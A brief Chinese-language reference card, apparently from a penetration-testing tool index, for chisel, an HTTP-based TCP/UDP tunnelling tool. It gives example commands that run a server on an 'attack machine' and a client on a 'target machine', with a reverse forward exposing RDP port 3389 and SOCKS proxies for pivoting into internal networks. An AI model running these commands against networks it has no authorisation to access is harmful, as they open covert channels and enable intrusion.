# chisel

## 简介
快速 TCP/UDP 隧道工具，通过 HTTP 传输

## 核心参数
- `server`: 服务端模式
- `client`: 客户端模式

## 命令示例
```bash
# 服务端（攻击机）
chisel server -p 8080 --reverse

# 客户端（目标机）- 反向端口转发
chisel client http://192.168.1.100:8080 R:4444:127.0.0.1:3389

# 客户端 - SOCKS 代理
chisel client http://192.168.1.100:8080 R:socks

# 服务端 - 正向代理
chisel server -p 8080 --socks5

# 客户端 - 连接正向代理
chisel client http://192.168.1.100:8080 socks
```

## 使用场景
内网穿透和端口转发

## 所属分类
- [协议隧道 (Protocol Tunneling)](../categories/22-protocol-tunneling.md)
